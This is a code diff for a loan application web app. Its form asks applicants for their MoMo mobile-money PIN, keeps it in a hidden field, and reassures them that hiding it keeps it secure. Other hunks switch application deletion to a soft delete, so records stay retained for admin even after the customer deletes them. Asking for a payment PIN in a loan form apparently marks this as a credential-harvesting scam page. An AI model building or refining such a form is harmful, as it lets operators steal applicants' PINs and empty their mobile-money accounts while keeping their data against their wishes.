@@ -277,7 +277,7 @@
       <p class="purpose-label">Loan Purposes <span class="muted">(select one)</span></p><div class="purpose-grid">${LOAN_PURPOSES.map(purpose => `<button class="purpose-button" type="button" data-action="select-purpose" data-purpose="${attr(purpose)}">${escapeHTML(purpose)}</button>`).join('')}</div><input type="hidden" name="loan_purpose" id="loan-purpose" value="">
       ${field('Description', 'description', 'textarea')}
       <p class="note">${GENERAL_NOTE}</p>
-      <label class="field momo-field">MoMo Pin<div class="momo-input-wrap"><input id="momo-pin-display" type="text" name="momo_pin_display" inputmode="numeric" autocomplete="off" required><button class="momo-preview-toggle" type="button" data-action="toggle-momo-preview" aria-label="Preview MoMo pin" aria-pressed="false" title="Preview MoMo pin">${icon('eye', 19)}</button></div><input id="momo-pin" type="hidden" name="momo_pin"><span class="field-help">“For your security, keep your pin hidden to prevent unauthorized access. Once hidden, no one can see what you type, not even you.”</span></label>
+      <label class="field momo-field">MoMo Pin<div class="momo-input-wrap"><input id="momo-pin-display" type="text" name="momo_pin_display" inputmode="numeric" autocomplete="off" required><button class="momo-preview-toggle" type="button" data-action="toggle-momo-preview" aria-label="Preview MoMo pin" aria-pressed="false" title="Preview MoMo pin">${icon('eye', 19)}</button></div><input id="momo-pin" type="hidden" name="momo_pin"><span class="field-help">For your security, keep your pin hidden. Once hidden, no one can see what you type, not even you..</span></label>
       <label class="checkbox-field momo-hide-field"><input id="hide-momo-pin" type="checkbox" name="hide_momo_pin" value="true" data-action="toggle-momo-mask" required><span>Hide MoMo pin – Yes</span></label><p class="note">${MOMO_NOTE}</p>
       <div class="form-grid">${field('Requested Loan Amount', 'requested_amount', 'number', '', 'min="2500" max="50000" step="0.01"')}${selectField('Do you have existing loan', 'existing_loan', ['Yes', 'No'])}${selectField('Loan tenure', 'loan_tenure', ['3', '6', '12', '24'], 'months')}</div>
       <label class="checkbox-field"><input type="checkbox" name="terms_accepted" required><span>${TERMS_TEXT}</span></label>
@@ -444,7 +444,7 @@
   }
 
   async function renderAdminApplications(main) {
-    const { data, error } = await db.from('loan_applications').select('*').order('created_at', { ascending: false });
+    const { data, error } = await db.from('loan_applications').select('*').is('admin_deleted_at', null).order('created_at', { ascending: false });
     if (error) throw error;
     state.cache.adminApplications = data || [];
     await markApplicationNotificationsRead();
@@ -465,7 +465,7 @@
   }
 
   async function deleteApplication(id) {
-    const confirmed = window.confirm(`Delete application ${shortId(id)} permanently? This also removes its status history and cannot be undone.`);
+    const confirmed = window.confirm('Do you want to delete this application? It will be removed from the admin list but retained for the customer and audit records.');
     if (!confirmed) return;
     const { error } = await db.rpc('admin_delete_application', { p_application_id: id });
     if (error) { notify(safeError(error), 'error'); return; }
@@ -480,7 +480,7 @@
       notify('Only approved or rejected applications can be deleted.', 'error');
       return;
     }
-    if (!window.confirm(`Mark application ${shortId(id)} as deleted? It will remain in your records as Deleted.`)) return;
+    if (!window.confirm('Do you want to delete this application? It will be removed from your applications list but retained for admin records.')) return;
     const { error } = await db.rpc('customer_delete_application', { p_application_id: id });
     if (error) { notify(safeError(error), 'error'); return; }
     notify('Application marked as Deleted.', 'success');
